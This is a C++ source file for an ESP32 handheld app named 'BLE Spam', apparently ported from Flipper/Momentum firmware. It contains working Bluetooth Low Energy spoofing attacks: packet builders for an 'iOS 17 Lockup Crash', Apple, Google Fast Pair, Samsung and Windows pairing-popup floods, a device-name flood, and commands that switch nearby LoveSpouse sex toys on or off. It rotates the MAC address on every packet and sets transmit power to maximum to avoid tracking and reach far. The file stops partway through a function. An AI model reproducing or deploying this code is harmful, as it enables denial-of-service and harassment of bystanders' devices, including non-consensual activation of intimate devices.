/**
 * @file app_08.cpp
 * @author Mingo
 * @brief App07 — BLE Spam implementation
 *        v4.0: Migrated to TUI (LovyanGFX direct drawing, app_10 style)
 * @version 4.0
 * @date 2026-05-12
 * @copyright Copyright (c) 2025
 */
#include "ble_spam.h"
#include "../app_common/hp_ui.h"
#include <cstring>
#include <cstdlib>
#include <algorithm>
#include <esp_random.h>
#include <esp_bt.h>
#include <esp_gap_ble_api.h>
#include <string>

/* ── Layout constants (same as app_10) ── */
static constexpr int SCR_W        = hp::W;
static constexpr int SCR_H        = hp::H;
static constexpr int HDR_H        = hp::CON_Y0;          // 18
static constexpr int FTR_H        = hp::H - hp::FTR_SEP; // 18
static constexpr int ITEM_H       = hp::ITEM2_H;         // 34 (2-line item)
static constexpr int MENU_Y0      = hp::CON_Y0 + 2;      // 20
static constexpr int MENU_VISIBLE = hp::LIST2_VIS;       // 5

/* Running-page status panel inside the shared TUI frame. */
static constexpr int RUN_PANEL_X = 6;
static constexpr int RUN_PANEL_Y = 90;
static constexpr int RUN_PANEL_W = hp::W - 12;
static constexpr int RUN_PANEL_H = 64;


/* ════════════════════════════════════════════════════════════════
 *  Apple Continuity — Proximity Pair models
 * ════════════════════════════════════════════════════════════════ */
static const uint16_t pp_models[] = {
    0x0E20, // AirPods Pro
    0x0A20, // AirPods Max
    0x0055, // Airtag
    0x0030, // Hermes Airtag
    0x0220, // AirPods
    0x0F20, // AirPods 2nd Gen
    0x1320, // AirPods 3rd Gen
    0x1420, // AirPods Pro 2nd Gen
    0x1020, // Beats Flex
    0x0620, // Beats Solo 3
    0x0320, // Powerbeats 3
    0x0B20, // Powerbeats Pro
    0x0C20, // Beats Solo Pro
    0x1120, // Beats Studio Buds
    0x0520, // Beats X
    0x0920, // Beats Studio 3
    0x1720, // Beats Studio Pro
    0x1220, // Beats Fit Pro
    0x1620, // Beats Studio Buds+
};
static constexpr int PP_MODELS_COUNT = sizeof(pp_models) / sizeof(pp_models[0]);

/* Apple Nearby Action IDs */
static const uint8_t na_actions[] = {
    0x13, // AppleTV AutoFill
    0x24, // Apple Vision Pro
    0x05, // Apple Watch
    0x27, // AppleTV Connecting...
    0x20, // Join This AppleTV?
    0x19, // AppleTV Audio Sync
    0x1E, // AppleTV Color Balance
    0x09, // Setup New iPhone
    0x2F, // Sign in to other device
    0x02, // Transfer Phone Number
    0x0B, // HomePod Setup
    0x01, // Setup New AppleTV
    0x06, // Pair AppleTV
    0x0D, // HomeKit AppleTV Setup
    0x2B, // AppleID for AppleTV?
};
static constexpr int NA_ACTIONS_COUNT = sizeof(na_actions) / sizeof(na_actions[0]);

/* ════════════════════════════════════════════════════════════════
 *  Google Fast Pair — model IDs (subset for PSRAM saving)
 * ════════════════════════════════════════════════════════════════ */
static const uint32_t fp_models[] = {
    0x0001F0, 0x000047, 0x470000, 0x00000A, 0x0A0000, 0x00000B,
    0x0B0000, 0x0C0000, 0x00000D, 0x000007, 0x070000, 0x000008,
    0x080000, 0x000009, 0x090000, 0x000035, 0x350000, 0x000048,
    0x480000, 0x000049, 0x490000, 0x001000, 0x00B727, 0x01E5CE,
    0x0200F0, 0x00F7D4, 0xF00002, 0xF00400, 0x1E89A7,
    0x00000C, 0x0577B1, 0x05A9BC,
    0xCD8256, 0x0000F0, 0xF00000, 0x821F66, 0xF52494, 0x718FA4,
    0x0002F0, 0x92BBBD, 0x000006, 0x060000, 0xD446A7, 0x2D7A23,
    0x0E30C3, 0x72EF8D, 0x72FB00, 0x0003F0, 0x002000, 0x003000,
    0x003001, 0x00A168, 0x00AA48, 0x00AA91, 0x00C95C, 0x01EEB4,
    0x02AA91, 0x038CC7, 0x02DD4F, 0x02E2A9, 0x035754, 0x02C95C,
    0x038B91, 0x02F637, 0x02D886,
    // Custom debug popups
    0x73A6F2, // Momentum Firmware
    0xD99CA1, // Flipper Zero
    0x77FF67, // Free Robux
    0xAA187F, // Free VBucks
    0xDCE9EA, // Rickroll
    0x87B25F, // Animated Rickroll
    0xF38C02, // Boykisser
    0x1448C9, // BLM
    0x13B39D, // Talking Sasquach
    0xAA1FE1, // ClownMaster
    0x7C6CDB, // Obama
    0x005EF9, // Ryanair
    0xE2106F, // FBI
    0xB37A62, // Tesla
};
static constexpr int FP_MODELS_COUNT = sizeof(fp_models) / sizeof(fp_models[0]);

/* ════════════════════════════════════════════════════════════════
 *  Samsung EasySetup — Buds models
 * ════════════════════════════════════════════════════════════════ */
static const uint32_t buds_models[] = {
    0xEE7A0C, 0x9D1700, 0x39EA48, 0xA7C62C, 0x850116,
    0x3D8F41, 0x3B6D02, 0xAE063C, 0xB8B905, 0xEAAA17,
    0xD30704, 0x9DB006, 0x101F1A, 0x859608, 0x8E4503,
    0x2C6740, 0x3F6718, 0x42C519, 0xAE073A, 0x011716,
};
static constexpr int BUDS_MODELS_COUNT = sizeof(buds_models) / sizeof(buds_models[0]);

/* Samsung EasySetup — Watch models */
static const uint8_t watch_models[] = {
    0x1A, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09,
    0x0A, 0x0B, 0x0C, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17,
    0x18, 0xE4, 0xE5, 0x1B, 0x1C, 0x1D, 0x1E, 0x20, 0xEC, 0xEF,
};
static constexpr int WATCH_MODELS_COUNT = sizeof(watch_models) / sizeof(watch_models[0]);

/* ════════════════════════════════════════════════════════════════
 *  LoveSpouse play/stop modes
 * ════════════════════════════════════════════════════════════════ */
static const uint32_t ls_play_modes[] = {
    0xE49C6C, 0xE7075E, 0xE68E4F, 0xE1313B, 0xE0B82A,
    0xE32318, 0xE2AA09, 0xED5DF1, 0xECD4E0,
    0xD41F5D, 0xD7846F, 0xD60D7E, 0xD1B20A, 0xD0B31B,
    0xD3A029, 0xD22938, 0xDDDEC0, 0xDC57D1,
    0xA4982E, 0xA7031C, 0xA68A0D, 0xA13579, 0xA0BC68,
    0xA3275A, 0xA2AE4B, 0xAD59B3, 0xACD0A2,
};
static constexpr int LS_PLAY_COUNT = sizeof(ls_play_modes) / sizeof(ls_play_modes[0]);

static const uint32_t ls_stop_modes[] = {
    0xE5157D, 0xD5964C, 0xA5113F,
};
static constexpr int LS_STOP_COUNT = sizeof(ls_stop_modes) / sizeof(ls_stop_modes[0]);

/* ════════════════════════════════════════════════════════════════
 *  SwiftPair / NameFlood — random device names
 * ════════════════════════════════════════════════════════════════ */
static const char* random_names[] = {
    "Assorted Spam", "BLE Spam", "MeowKit", "Flipper",
    "AirPods", "Galaxy Buds", "JBL Flip 6", "Bose QC",
    "Xbox Controller", "PS5 Controller", "Smart TV",
    "Keyboard BT", "Mouse BT", "Pixel Buds", "Echo Dot",
    "Nest Hub", "HomePod mini", "Arduino BLE", "ESP32",
    "Raspberry Pi", "NimBLE Device", "MEOW-BT",
};
static constexpr int NAMES_COUNT = sizeof(random_names) / sizeof(random_names[0]);

/* ════════════════════════════════════════════════════════════════
 *  Attack table
 * ════════════════════════════════════════════════════════════════ */
/* Order, titles and descriptions match Momentum-Apps/ble_spam (commit
 * e9230bc), file ble_spam.c → static Attack attacks[]. */
enum AttackId {
    ATK_KITCHEN_SINK = 0,    // "The Kitchen Sink"
    ATK_NAME_FLOOD,          // "BT Settings Flood"
    ATK_APPLE_CRASH,         // "iOS 17 Lockup Crash"
    ATK_APPLE_ACTION,        // "Apple Action Modal"
    ATK_APPLE_DEVICE,        // "Apple Device Popup"
    ATK_FAST_PAIR,           // "Android Device Connect"
    ATK_SAMSUNG_BUDS,        // "Samsung Buds Popup"
    ATK_SAMSUNG_WATCH,       // "Samsung Watch Pair"
    ATK_SWIFT_PAIR,          // "Windows Device Found"
    ATK_LOVESPOUSE_PLAY,     // "Vibrate 'em All"
    ATK_LOVESPOUSE_STOP,     // "Denial of Pleasure"
    ATK_COUNT
};

static const struct { const char* title; const char* sub; } attacks[] = {
    { "The Kitchen Sink",      "Flood all attacks at once"  },
    { "BT Settings Flood",     "Fills available BT devices" },
    { "iOS 17 Lockup Crash",   "Newer iPhones, long range"  },
    { "Apple Action Modal",    "Lock cooldown, long range"  },
    { "Apple Device Popup",    "No cooldown, close range"   },
    { "Android Device Connect","Reboot cooldown, long range"},
    { "Samsung Buds Popup",    "No cooldown, long range"    },
    { "Samsung Watch Pair",    "No cooldown, long range"    },
    { "Windows Device Found",  "No cooldown, short range"   },
    { "Vibrate 'em All",       "Activate all LoveSpouse toys"},
    { "Denial of Pleasure",    "Disable all LoveSpouse toys"},
};

/* ── Utility ── */
static inline uint8_t rnd8()  { return esp_random() & 0xFF; }
static inline uint16_t rnd16(){ return esp_random() & 0xFFFF; }

namespace MOONCAKE::APPS
{

/* ══════════════════════════════════════════════════════════════
 *  Constructor
 * ══════════════════════════════════════════════════════════════ */
App07::App07(DEVICES* device) : _device(device)
{
    setAppInfo().name = "BLE Spam";
}

/* ══════════════════════════════════════════════════════════════
 *  Lifecycle
 * ══════════════════════════════════════════════════════════════ */
void App07::onOpen()
{
    _advertising = false;
    _bleInited   = false;
    _packetCount = 0;
    _menuSel = 0;
    _scrollOffset = 0;
    _bHeld = (_device->button.B.read() == Button_Class::PRESSED);
    _bBackPending = false;
    _ledActive = false;
    _device->led.off();
    _switchPage(BsPage::MainMenu);
}

void App07::onRunning()
{
    _device->button.update();
    _device->button.tick();

    /* Launcher owns long-B exit and calls onClose before returning to UI.
     * Do not close independently here: Launcher must update its app state. */
    if (_device->button.B.isLongPress()) {
        _stopSpam();
        _bBackPending = false;
        return;
    }

    const bool bDown = (_device->button.B.state() == Button_Class::PRESSED);
    if (bDown && !_bHeld) {
        _bBackPending = (_page == BsPage::Running);
        _stopSpam();  // Stop immediately, even before the hold threshold.
        if (_page == BsPage::Running) {
            _drawRunningStatic();
            _drawRunningStatus();
        }
    }
    if (!bDown && _bHeld) {
        if (_bBackPending) _switchPage(BsPage::MainMenu);
        _bBackPending = false;
        _device->button.B.hasChanged();
    }
    _bHeld = bDown;
    if (bDown) {
        // Ignore simultaneous inputs while the user is stopping/exiting.
        _device->button.A.hasChanged();
        _device->button.Up.hasChanged();
        _device->button.Down.hasChanged();
        _device->button.Left.hasChanged();
        _device->button.Right.hasChanged();
        return;
    }

    if (_sceneDirty) {
        _sceneDirty = false;
        switch (_page) {
        case BsPage::MainMenu: _enterMainMenu(); break;
        case BsPage::Running:  _enterRunning();  break;
        }
    }

    switch (_page) {
    case BsPage::MainMenu: _runMainMenu();   break;
    case BsPage::Running:  _updateRunning(); break;
    }

    /* Keep LED animation ticking (used during broadcasting). */
    if (_ledActive) _device->led.update();
}

void App07::onClose()
{
    _stopSpam();
    _deinitBLE();
    _setLedActive(false);
    _bHeld = false;
    _bBackPending = false;
}

/* ══════════════════════════════════════════════════════════════
 *  Page management
 * ══════════════════════════════════════════════════════════════ */
void App07::_switchPage(BsPage p)
{
    _page = p;
    _sceneDirty = true;
}

/* ══════════════════════════════════════════════════════════════
 *  TUI drawing helpers (app_10 style)
 * ══════════════════════════════════════════════════════════════ */
void App07::_drawHeader(const char* title)
{
    auto& Lcd = _device->Lcd;
    hp::drawChrome(Lcd);
    hp::drawHeader(Lcd, title);
}

void App07::_drawMenuItem(int y, int index, const char* text, const char* sub, bool selected)
{
    (void)index;
    int row = (y - MENU_Y0) / ITEM_H;
    if (row < 0) row = 0;
    if (row >= hp::LIST2_VIS) row = hp::LIST2_VIS - 1;
    hp::drawListItemSub(_device->Lcd, row, text, sub, selected);
    hp::drawScrollbar2(_device->Lcd, _menuCount, _scrollOffset, MENU_VISIBLE);
}

void App07::_drawFooter(const char* left, const char* right)
{
    hp::drawFooter(_device->Lcd, left, right);
}

/* Three-segment footer with fixed slots: [Dir] left, [A] centre, [B] right. */
void App07::_drawFooter3(const char* dirHint, const char* aHint, const char* bHint)
{
    auto& Lcd = _device->Lcd;
    Lcd.fillRect(1, hp::FTR_SEP + 1, hp::W - 2,
                 hp::FTR_BOTTOM - hp::FTR_SEP - 1, hp::COL_BG);
    Lcd.setFont(&fonts::efontCN_16);
    Lcd.setTextColor(hp::COL_FG, hp::COL_BG);
    if (dirHint && dirHint[0]) {
        Lcd.setCursor(hp::PAD_X, hp::FTR_TXT);
        Lcd.print(dirHint);
    }
    if (aHint && aHint[0]) {
        int tw = (int)strlen(aHint) * 8;
        Lcd.setCursor((hp::W - tw) / 2, hp::FTR_TXT);
        Lcd.print(aHint);
    }
    if (bHint && bHint[0]) {
        int tw = (int)strlen(bHint) * 8;
        Lcd.setCursor(hp::W - tw - hp::PAD_X, hp::FTR_TXT);
        Lcd.print(bHint);
    }
}

/* ══════════════════════════════════════════════════════════════
 *  MainMenu — list of attacks (TUI style)
 * ══════════════════════════════════════════════════════════════ */
void App07::_enterMainMenu()
{
    _menuCount = ATK_COUNT;
    if (_menuSel >= _menuCount) _menuSel = 0;
    if (_scrollOffset > _menuCount - MENU_VISIBLE)
        _scrollOffset = std::max(0, _menuCount - MENU_VISIBLE);

    _drawHeader("BLE Spam");
    _drawFooter3("[^v]Select", "[A]Enter", "Hold B:Exit");

    int end = std::min(_menuCount - _scrollOffset, MENU_VISIBLE);
    for (int i = 0; i < end; i++) {
        int idx = i + _scrollOffset;
        _drawMenuItem(MENU_Y0 + i * ITEM_H, i,
                      attacks[idx].title, attacks[idx].sub,
                      i == _menuSel);
    }
}

void App07::_runMainMenu()
{
    bool redraw = false;

    if (_device->button.Up.pressed()) {
        if (_menuSel > 0) { _menuSel--; }
        else if (_scrollOffset > 0) { _scrollOffset--; }
        redraw = true;
    }
    if (_device->button.Down.pressed()) {
        if (_menuSel < MENU_VISIBLE - 1 && _menuSel < _menuCount - _scrollOffset - 1) {
            _menuSel++;
        } else if (_scrollOffset + MENU_VISIBLE < _menuCount) {
            _scrollOffset++;
        }
        redraw = true;
    }

    if (redraw) {
        int visible = std::min(_menuCount - _scrollOffset, MENU_VISIBLE);
        for (int i = 0; i < MENU_VISIBLE; i++) {
            int dataIdx = i + _scrollOffset;
            if (i < visible) {
                _drawMenuItem(MENU_Y0 + i * ITEM_H, i,
                              attacks[dataIdx].title, attacks[dataIdx].sub,
                              i == _menuSel);
            } else {
                _device->Lcd.fillRect(0, MENU_Y0 + i * ITEM_H, SCR_W, ITEM_H, BS_BG);
            }
        }
    }

    if (_device->button.A.pressed()) {
        _attackIdx = _menuSel + _scrollOffset;
        _switchPage(BsPage::Running);   /* Enter running page idle; press A to start */
    }
    /* Short B stays at the top-level menu. Hold B exits via Launcher. */
}

/* ══════════════════════════════════════════════════════════════
 *  Running page — live status (TUI style)
 * ══════════════════════════════════════════════════════════════ */

void App07::_setLedActive(bool on)
{
    if (on == _ledActive) return;
    _ledActive = on;
    if (on) {
        _device->led.setEffect(WS2812B_Class::BLINK_FAST,
                               WS2812B_Class::WHITE, 1.0f);
    } else {
        _device->led.off();
    }
}

void App07::_enterRunning()
{
    _lastDrawTime = 0;
    _drawRunningStatic();
    _drawRunningStatus();
}

/* Draw the shared TUI frame without SD assets or a background sprite. */
void App07::_drawRunningStatic()
{
    auto& Lcd = _device->Lcd;
    hp::drawChrome(Lcd);
    hp::drawHeader(Lcd, "BLE Spam");
    Lcd.setFont(&fonts::efontCN_16);
    Lcd.setTextColor(BS_FG_DIM, BS_BG);
    Lcd.setCursor(hp::PAD_X, 40);
    Lcd.print("B: stop and back. Hold B: exit.");
    Lcd.drawRect(RUN_PANEL_X, RUN_PANEL_Y, RUN_PANEL_W, RUN_PANEL_H, BS_FG);
    _drawFooter3("[^v]Speed", _advertising ? "[A]Stop" : "[A]Start", "[B]Back");
}

/* Redraw just the dynamic status text inside the overlay panel. */
void App07::_drawRunningStatus()
{
    auto& Lcd = _device->Lcd;

    /* Status badge uses the same header as the menu. */
    const char* stStr = _advertising ? "ACTIVE" : "IDLE";
    uint16_t stCol = _advertising ? BS_ACCENT : BS_FG_DIM;
    hp::drawHeader(Lcd, "BLE Spam", stStr, stCol);

    /* Clear interior of status panel (keep border) */
    Lcd.fillRect(RUN_PANEL_X + 1, RUN_PANEL_Y + 1,
                 RUN_PANEL_W - 2, RUN_PANEL_H - 2, BS_BG);

    int y = RUN_PANEL_Y + 4;

    /* Attack name */
    Lcd.setTextColor(BS_ACCENT, BS_BG);
    Lcd.setCursor(RUN_PANEL_X + 6, y);
    Lcd.printf("#%02d %s", _attackIdx, attacks[_attackIdx].title);
    y += 18;

    /* Interval + packets on one row */
    Lcd.setTextColor(BS_FG, BS_BG);
    Lcd.setCursor(RUN_PANEL_X + 6, y);
    Lcd.printf("INT:%-4ums", (unsigned)_delayMs);
    Lcd.setTextColor(BS_ACCENT, BS_BG);
    Lcd.setCursor(RUN_PANEL_X + 6 + 12 * 8, y);
    Lcd.printf("PKT:%lu", (unsigned long)_packetCount);
    y += 18;

    /* Sub-title */
    Lcd.setTextColor(BS_FG_DIM, BS_BG);
    Lcd.setCursor(RUN_PANEL_X + 6, y);
    Lcd.print(attacks[_attackIdx].sub);
}

void App07::_updateRunning()
{
    /* B press/release is handled centrally in onRunning(). */

    /* A = toggle broadcast on/off (stay on running page) */
    if (_device->button.A.pressed()) {
        if (_advertising) _stopSpam();
        else              _startSpam();
        _drawRunningStatic();   /* refresh footer + frame for new state */
        _drawRunningStatus();
        return;
    }

    /* Up/Down = adjust delay live, ladder 20 → 50 → 100 → 200 → 500 ms */
    bool intervalChanged = false;
    if (_device->button.Up.pressed()) {
        if      (_delayMs <  20)   _delayMs = 20;
        else if (_delayMs == 20)   _delayMs = 50;
        else if (_delayMs == 50)   _delayMs = 100;
        else if (_delayMs == 100)  _delayMs = 200;
        else if (_delayMs == 200)  _delayMs = 500;
        intervalChanged = true;
    }
    if (_device->button.Down.pressed()) {
        if      (_delayMs >  500)  _delayMs = 500;
        else if (_delayMs == 500)  _delayMs = 200;
        else if (_delayMs == 200)  _delayMs = 100;
        else if (_delayMs == 100)  _delayMs = 50;
        else if (_delayMs == 50)   _delayMs = 20;
        intervalChanged = true;
    }

    /* Send packets at interval (only when broadcasting) */
    unsigned long now = millis();
    if (_advertising && (now - _lastAdvTime >= _delayMs)) {
        _lastAdvTime = now;

        uint8_t pkt[64];
        uint8_t pktLen = 0;

        switch (_attackIdx) {
        case ATK_KITCHEN_SINK:    _makePacketKitchenSink(pkt, pktLen);    break;
        case ATK_APPLE_CRASH:     _makePacketAppleCrash(pkt, pktLen);     break;
        case ATK_APPLE_ACTION:    _makePacketAppleAction(pkt, pktLen);    break;
        case ATK_APPLE_DEVICE:    _makePacketAppleDevice(pkt, pktLen);    break;
        case ATK_FAST_PAIR:       _makePacketFastPair(pkt, pktLen);       break;
        case ATK_SAMSUNG_BUDS:    _makePacketEasySetupBuds(pkt, pktLen);  break;
        case ATK_SAMSUNG_WATCH:   _makePacketEasySetupWatch(pkt, pktLen); break;
        case ATK_SWIFT_PAIR:      _makePacketSwiftPair(pkt, pktLen);      break;
        case ATK_NAME_FLOOD:      _makePacketNameFlood(pkt, pktLen);      break;
        case ATK_LOVESPOUSE_PLAY: _makePacketLoveSpousePlay(pkt, pktLen); break;
        case ATK_LOVESPOUSE_STOP: _makePacketLoveSpouseStop(pkt, pktLen); break;
        }

        if (pktLen > 0) {
            _sendPacket(pkt, pktLen);
            _packetCount++;
        }
    }

    /* Repaint status ~5 fps (or instantly if interval changed) */
    if (intervalChanged || (now - _lastDrawTime >= 200)) {
        _lastDrawTime = now;
        _drawRunningStatus();
    }
}

/* ══════════════════════════════════════════════════════════════
 *  BLE helpers — RAW Bluedroid GAP path (Flipper-style burst speed)
 *
 *  v5.0 design (responsiveness fix):
 *  ─────────────────────────────────────────────────────────────
 *  Why the old NimBLE-style wrapper (BLEAdvertising::stop/start) was
 *  slow on Windows Swift Pair:
 *    • Each stop()/start() blocks on a GAP-event semaphore for up to
 *      100-1000 ms.  With MAC rotated every 150 ms, real adv airtime
 *      was reduced to ~30 % → Windows often missed the burst.
 *    • Creating a BLEServer adds GATT TX overhead per advertising
 *      cycle even when no client connects.
 *
 *  v5.0 bypass:
 *    1) NO BLEServer.  Just BLEDevice::init() + raw esp_ble_gap_* APIs.
 *    2) Adv params configured ONCE via esp_ble_gap_start_advertising().
 *    3) Each new packet:
 *         - esp_ble_gap_set_rand_addr(addr)   ← non-blocking, async
 *         - esp_ble_gap_config_adv_data_raw() ← non-blocking, async
 *       The radio keeps cycling at the HW interval (20 ms) and the
 *       new MAC + payload take effect on the next ADV event.
 *    4) Min HW interval = 20 ms (0x20).  Channel map = all 3.
 *    5) MAC rotates EVERY packet → each broadcast looks like a
 *       brand-new device (Swift Pair / Fast Pair criterion).
 * ══════════════════════════════════════════════════════════════ */

static esp_ble_adv_params_t s_adv_params = {
    .adv_int_min        = 0x20,   // 20 ms
    .adv_int_max        = 0x30,   // 30 ms
    .adv_type           = ADV_TYPE_NONCONN_IND,
    .own_addr_type      = BLE_ADDR_TYPE_RANDOM,
    .peer_addr          = {0,0,0,0,0,0},
    .peer_addr_type     = BLE_ADDR_TYPE_PUBLIC,
    .channel_map        = ADV_CHNL_ALL,
    .adv_filter_policy  = ADV_FILTER_ALLOW_SCAN_ANY_CON_ANY,
};

static void _gapEventCb(esp_gap_ble_cb_event_t event, esp_ble_gap_cb_param_t* param)
{
    /* Silent — we don't need event acks; raw API is fire-and-forget */
    (void)event; (void)param;
}

void App07::_initBLE()
{
    if (_bleInited) return;

    /* Tear down any prior BLE state cleanly */
    BLEDevice::deinit(false);
    delay(50);

    /* BLEDevice::init() boots the controller + Bluedroid stack but
     * (importantly) does NOT create any GATT server.  We then talk
     * directly to esp_ble_gap_*. */
    BLEDevice::init("");

    esp_ble_gap_register_callback(_gapEventCb);

    /* TX power max on every channel — Windows Swift Pair RSSI gate
     * is around -75 dBm; weaker signal = ignored. */
    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV,     APP08_MAX_TX_POWER);
    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_DEFAULT, APP08_MAX_TX_POWER);

    /* Initial random address (will be replaced on first packet) */
    esp_bd_addr_t init_addr;
    esp_fill_random(init_addr, 6);
    init_addr[0] = (init_addr[0] | 0xC0);   // random-static prefix
    esp_ble_gap_set_rand_addr(init_addr);

    _bleInited        = true;
    _advRunning       = false;
    _pServer          = nullptr;
    _pAdvertising     = nullptr;
}

void App07::_deinitBLE()
{
    if (!_bleInited) return;
    if (_advRunning) {
        esp_ble_gap_stop_advertising();
        _advRunning = false;
    }
    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV,     ESP_PWR_LVL_N0);
    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_DEFAULT, ESP_PWR_LVL_N0);
    _bleInited = false;
    try { BLEDevice::deinit(false); } catch (...) {}
}

void App07::_sendPacket(const uint8_t* data, uint8_t len)
{
    if (!_bleInited || len == 0) return;

    /* New random-static MAC every packet → maximum device diversity.
     * esp_ble_gap_set_rand_addr() is non-blocking; the controller
     * picks it up on the next ADV interval (20-30 ms). */
    esp_bd_addr_t addr;
    esp_fill_random(addr, 6);
    addr[0] = (addr[0] | 0xC0);             // top 2 bits = 11 (static)
    esp_ble_gap_set_rand_addr(addr);

    /* Update payload in-place — also non-blocking. */
    esp_ble_gap_config_adv_data_raw((uint8_t*)data, len);

    /* First packet: kick off advertising. After that the controller
     * keeps cycling on its own at the HW interval (20-30 ms). */
    if (!_advRunning) {
        esp_ble_gap_start_advertising(&s_adv_params);
        _advRunning = true;
    }
}

void App07::_startSpam()
{
    _initBLE();
    _advertising      = true;
    _packetCount      = 0;
    _lastAdvTime      = 0;
    _lastDrawTime     = 0;
    _lastMacChangeTime = 0;
    _setLedActive(true);
    if (_page != BsPage::Running) _switchPage(BsPage::Running);
}

void App07::_stopSpam()
{
    _advertising = false;
    if (_bleInited && _advRunning) {
        esp_ble_gap_stop_advertising();
        _advRunning = false;
    }
    _setLedActive(false);
}

/* ══════════════════════════════════════════════════════════════
 *  Packet generators — ported from Momentum-Apps protocols
 * ══════════════════════════════════════════════════════════════ */

/* ── Apple Continuity: Custom Crash (iOS 17) ── */
void App07::_makePacketAppleCrash(uint8_t* buf, uint8_t& len)
{
    uint8_t action = na_actions[esp_random() % NA_ACTIONS_COUNT];
    uint8_t flags  = 0xC0;
    if (action == 0x20 && (esp_random() & 1)) flags--;
    if (action == 0x09 && (esp_random() & 1)) flags = 0x40;

    uint8_t i = 0;
    buf[i++] = 16;    // Size (total - 1)
    buf[i++] = 0xFF;  // AD Type: Manufacturer Specific
    buf[i++] = 0x4C;  // Company ID: Apple
    buf[i++] = 0x00;
    // Override with NearbyAction
    buf[i++] = 0x0F;  // Continuity Type: NearbyAction
    buf[i++] = 5;     // Continuity Size
    buf[i++] = flags;
    buf[i++] = action;
    esp_fill_random(&buf[i], 3);  // Auth tag
    i += 3;
    buf[i++] = 0x00;  // Additional action data terminator
    buf[i++] = 0x00;
    buf[i++] = 0x10;  // NearbyInfo type
    esp_fill_random(&buf[i], 3);
    i += 3;

    len = i;
}

/* ── Apple Continuity: Nearby Action Modal ── */
void App07::_makePacketAppleAction(uint8_t* buf, uint8_t& len)
{
    uint8_t action = na_actions[esp_random() % NA_ACTIONS_COUNT];
    uint8_t flags = 0xC0;
    if (action == 0x20 && (esp_random() & 1)) flags--;
    if (action == 0x09 && (esp_random() & 1)) flags = 0x40;

    uint8_t i = 0;
    buf[i++] = 10;    // Size
    buf[i++] = 0xFF;  // Manufacturer Specific
    buf[i++] = 0x4C;  // Apple
    buf[i++] = 0x00;
    buf[i++] = 0x0F;  // NearbyAction
    buf[i++] = 5;     // Size
    buf[i++] = flags;
    buf[i++] = action;
    esp_fill_random(&buf[i], 3);
    i += 3;

    len = i;
}

/* ── Apple Continuity: Proximity Pair (device popup) ── */
void App07::_makePacketAppleDevice(uint8_t* buf, uint8_t& len)
{
    uint16_t model = pp_models[esp_random() % PP_MODELS_COUNT];
    uint8_t color  = rnd8();

    uint8_t prefix = 0x01;  // "Not Your Device"
    if (model == 0x0055 || model == 0x0030) prefix = 0x05;  // Airtag

    uint8_t i = 0;
    buf[i++] = 30;    // Size (HEADER_LEN + 25 - 1)
    buf[i++] = 0xFF;  // Manufacturer Specific
    buf[i++] = 0x4C;  // Apple
    buf[i++] = 0x00;
    buf[i++] = 0x07;  // ProximityPair
    buf[i++] = 25;    // Continuity Size
    buf[i++] = prefix;
    buf[i++] = (model >> 8) & 0xFF;
    buf[i++] = model & 0xFF;
    buf[i++] = 0x55;  // Status
    buf[i++] = ((esp_random() % 10) << 4) | (esp_random() % 10);  // Buds battery
    buf[i++] = ((esp_random() % 8) << 4)  | (esp_random() % 10);  // Charging + case
    buf[i++] = rnd8();  // Lid open counter
    buf[i++] = color;
    buf[i++] = 0x00;
    esp_fill_random(&buf[i], 16);  // Encrypted payload
    i += 16;

    len = i;
}

/* ── Google Fast Pair ── */
void App07::_makePacketFastPair(uint8_t* buf, uint8_t& len)
{
    uint32_t model = fp_models[esp_random() % FP_MODELS_COUNT];

    uint8_t i = 0;
    buf[i++] = 2;     buf[i++] = 0x01; buf[i++] = 0x06;  // Flags: General Discoverable

    buf[i++] = 3;     // Size
    buf[i++] = 0x03;  // AD Type: Service UUID List
    buf[i++] = 0x2C;  // Google FastPair UUID
    buf[i++] = 0xFE;

    buf[i++] = 6;     // Size
    buf[i++] = 0x16;  // AD Type: Service Data
    buf[i++] = 0x2C;  // Google FastPair UUID
    buf[i++] = 0xFE;
    buf[i++] = (model >> 16) & 0xFF;
    buf[i++] = (model >> 8)  & 0xFF;
    buf[i++] = model & 0xFF;

    buf[i++] = 2;     // Size
    buf[i++] = 0x0A;  // AD Type: Tx Power Level
    buf[i++] = (int8_t)((esp_random() % 120) - 100);  // -100 to +20 dBm

    len = i;
}

/* ── Samsung EasySetup: Buds ── */
void App07::_makePacketEasySetupBuds(uint8_t* buf, uint8_t& len)
{
    uint32_t model = buds_models[esp_random() % BUDS_MODELS_COUNT];

    uint8_t i = 0;
    buf[i++] = 2;     buf[i++] = 0x01; buf[i++] = 0x06;  // Flags: General Discoverable

    buf[i++] = 27;    // Size
    buf[i++] = 0xFF;  // Manufacturer Specific
    buf[i++] = 0x75;  // Samsung
    buf[i++] = 0x00;
    buf[i++] = 0x42;
    buf[i++] = 0x09;
    buf[i++] = 0x81;
    buf[i++] = 0x02;
    buf[i++] = 0x14;
    buf[i++] = 0x15;
    buf[i++] = 0x03;
    buf[i++] = 0x21;
    buf[i++] = 0x01;
    buf[i++] = 0x09;
    buf[i++] = (model >> 16) & 0xFF;
    buf[i++] = (model >> 8)  & 0xFF;
    buf[i++] = 0x01;
    buf[i++] = model & 0xFF;
    buf[i++] = 0x06;
    buf[i++] = 0x3C;
    buf[i++] = 0x94;
    buf[i++] = 0x8E;
    buf[i++] = 0x00;
    buf[i++] = 0x00;
    buf[i++] = 0x00;
    buf[i++] = 0x00;
    buf[i++] = 0xC7;
    buf[i++] = 0x00;

    /* Second truncated AD segment (Android fills the rest) */
    // NimBLE will only accept up to 31 bytes total; 
    // skip the second 0xFF segment if exceeding

    len = i;
}

/* ── Samsung EasySetup: Watch ── */
void App07::_makePacketEasySetupWatch(uint8_t* buf, uint8_t& len)
{
    uint8_t model = watch_models[esp_random() % WATCH_MODELS_COUNT];

    uint8_t i = 0;
    buf[i++] = 2;     buf[i++] = 0x01; buf[i++] = 0x06;  // Flags: General Discoverable

    buf[i++] = 14;    // Size
    buf[i++] = 0xFF;  // Manufacturer Specific
    buf[i++] = 0x75;  // Samsung
    buf[i++] = 0x00;
    buf[i++] = 0x01;
    buf[i++] = 0x00;
    buf[i++] = 0x02;
    buf[i++] = 0x00;
    buf[i++] = 0x01;
    buf[i++] = 0x01;
    buf[i++] = 0xFF;
    buf[i++] = 0x00;
    buf[i++] = 0x00;
